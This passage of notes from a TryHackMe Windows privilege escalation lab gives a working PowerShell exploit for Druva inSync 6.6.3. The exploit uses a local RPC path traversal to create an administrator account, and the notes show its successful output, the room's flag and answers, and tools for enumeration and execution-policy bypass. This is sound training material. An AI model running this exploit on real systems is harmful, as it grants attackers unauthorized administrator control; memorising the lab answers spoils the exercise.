This will create user pwnd with a password of SimplePass123 and add it to the administrators' group. If the exploit was successful, you should be able to run the following command to verify that the user pwnd exists and is part of the administrators' group:

```
Command Prompt

PS C:\> net user pwnd
User name                    pwnd
Full Name
Account active               Yes
[...]

Local Group Memberships      *Administrators       *Users
Global Group memberships     *None
```

As a last step, you can run a command prompt as administrator:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/bbd0af143c9a9b31c1acce32fabfdc0f.png)

When prompted for credentials, use the pwnd account. From the new command prompt, you can retrieve your flag from the Administrator's desktop with the following command type `C:\Users\Administrator\Desktop\flag.txt`.

```added
$ErrorActionPreference = "Stop"

$cmd = "net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)

```

```
C:\Users\thm-unpriv>wmic produt get name,version,vendor
produt - Alias not found.

C:\Users\thm-unpriv>wmic product get name,version,vendor
Name                                                            Vendor                                   Version
Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.28.29910     Microsoft Corporation                    14.28.29910
AWS Tools for Windows                                           Amazon Web Services Developer Relations  3.15.1248
VNC Server 6.8.0                                                RealVNC                                  6.8.0.45849
Amazon SSM Agent                                                Amazon Web Services                      3.0.529.0
aws-cfn-bootstrap                                               Amazon Web Services                      2.0.5
Druva inSync 6.6.3                                              Druva Technologies Pte. Ltd.             6.6.3.0
AWS PV Drivers                                                  Amazon Web Services                      8.3.4
Microsoft Visual C++ 2019 X64 Additional Runtime - 14.28.29910  Microsoft Corporation                    14.28.29910


powershell

Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\thm-unpriv> $ErrorActionPreference = "Stop"
PS C:\Users\thm-unpriv>
PS C:\Users\thm-unpriv> $cmd = "net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add"
PS C:\Users\thm-unpriv>
PS C:\Users\thm-unpriv> $s = New-Object System.Net.Sockets.Socket(
>>     [System.Net.Sockets.AddressFamily]::InterNetwork,
>>     [System.Net.Sockets.SocketType]::Stream,
>>     [System.Net.Sockets.ProtocolType]::Tcp
>> )
PS C:\Users\thm-unpriv> $s.Connect("127.0.0.1", 6064)
PS C:\Users\thm-unpriv>
PS C:\Users\thm-unpriv> $header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
PS C:\Users\thm-unpriv> $rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
PS C:\Users\thm-unpriv> $command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
PS C:\Users\thm-unpriv> $length = [System.BitConverter]::GetBytes($command.Length);
PS C:\Users\thm-unpriv>
PS C:\Users\thm-unpriv> $s.Send($header)
22
PS C:\Users\thm-unpriv> $s.Send($rpcType)
4
PS C:\Users\thm-unpriv> $s.Send($length)
4
PS C:\Users\thm-unpriv> $s.Send($command)
280
PS C:\Users\thm-unpriv> net user pwnd
User name                    pwnd
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            9/2/2022 5:00:57 PM
Password expires             10/14/2022 5:00:57 PM
Password changeable          9/2/2022 5:00:57 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators       *Users
Global Group memberships     *None
The command completed successfully.

## use pwnd with the pass SimplePass123 (just choose pwnd and enter)

                                                                                C:\Windows\system32>whoami                                                                                              wprivesc3\pwnd                                                                                                                                                                                                                                  C:\Windows\system32>type C:\Users\Administrator\Desktop\flag.txt                                                        THM{EZ_DLL_PROXY_4ME}  

```

![[Pasted image 20220902121217.png]]

Get the flag on the Administrator's desktop.
*THM{EZ_DLL_PROXY_4ME} *

###  Tools of the Trade 

Several scripts exist to conduct system enumeration in ways similar to the ones seen in the previous task. These tools can shorten the enumeration process time and uncover different potential privilege escalation vectors. However, please remember that automated tools can sometimes miss privilege escalation.

Below are a few tools commonly used to identify privilege escalation vectors. Feel free to run them against any of the machines in this room and see if the results match the discussed attack vectors.


WinPEAS

WinPEAS is a script developed to enumerate the target system to uncover privilege escalation paths. You can find more information about winPEAS and download either the precompiled executable or a .bat script. WinPEAS will run commands similar to the ones listed in the previous task and print their output. The output from winPEAS can be lengthy and sometimes difficult to read. This is why it would be good practice to always redirect the output to a file, as shown below:

```Command Prompt           
C:\> winpeas.exe > outputfile.txt
```        

WinPEAS can be downloaded [here](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)

PrivescCheck

PrivescCheck is a PowerShell script that searches common privilege escalation on the target system. It provides an alternative to WinPEAS without requiring the execution of a binary file.

PrivescCheck can be downloaded [here](https://github.com/itm4n/PrivescCheck).

Reminder: To run PrivescCheck on the target system, you may need to bypass the execution policy restrictions. To achieve this, you can use the Set-ExecutionPolicy cmdlet as shown below.

```Powershell
           
PS C:\> Set-ExecutionPolicy Bypass -Scope process -Force
PS C:\> . .\PrivescCheck.ps1
PS C:\> Invoke-PrivescCheck
```

WES-NG: Windows Exploit Suggester - Next Generation

Some exploit suggesting scripts (e.g. winPEAS) will require you to upload them to the target system and run them there. This may cause antivirus software to detect and delete them. To avoid making unnecessary noise that can attract attention, you may prefer to use WES-NG, which will run on your attacking machine (e.g. Kali or TryHackMe AttackBox).

WES-NG is a Python script that can be found and downloaded [here](https://github.com/bitsadmin/wesng).

Once installed, and before using it, type the `wes.py --update` command to update the database. The script will refer to the database it creates to check for missing patches that can result in a vulnerability you can use to elevate your privileges on the target system.

To use the script, you will need to run the `systeminfo` command on the target system. Do not forget to direct the output to a .txt file you will need to move to your attacking machine.

Once this is done, wes.py can be run as follows;
```
Kali Linux

user@kali$ wes.py systeminfo.txt
```        


Metasploit

If you already have a Meterpreter shell on the target system, you can use the `multi/recon/local_exploit_suggester` module to list vulnerabilities that may affect the target system and allow you to elevate your privileges on the target system.


Click and continue learning!
*No answer needed*

### Conclusion 


In this room, we have introduced several privilege escalation techniques available in Windows systems. These techniques should provide you with a solid background on the most common paths attackers can take to elevate privileges on a system. Should you be interested in learning about additional techniques, the following resources are available:

    PayloadsAllTheThings - Windows Privilege Escalation (https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
    Priv2Admin - Abusing Windows Privileges (https://github.com/gtworek/Priv2Admin)
    RogueWinRM Exploit (https://github.com/antonioCoco/RogueWinRM)
    Potatoes (https://jlajara.gitlab.io/Potatoes_Windows_Privesc)
    Decoder's Blog (https://decoder.cloud/)
    Token Kidnapping (https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf)
    Hacktricks - Windows Local Privilege Escalation (https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)



Click and continue learning!
*No answer needed*

[[Vulnerability Capstone]]





















   

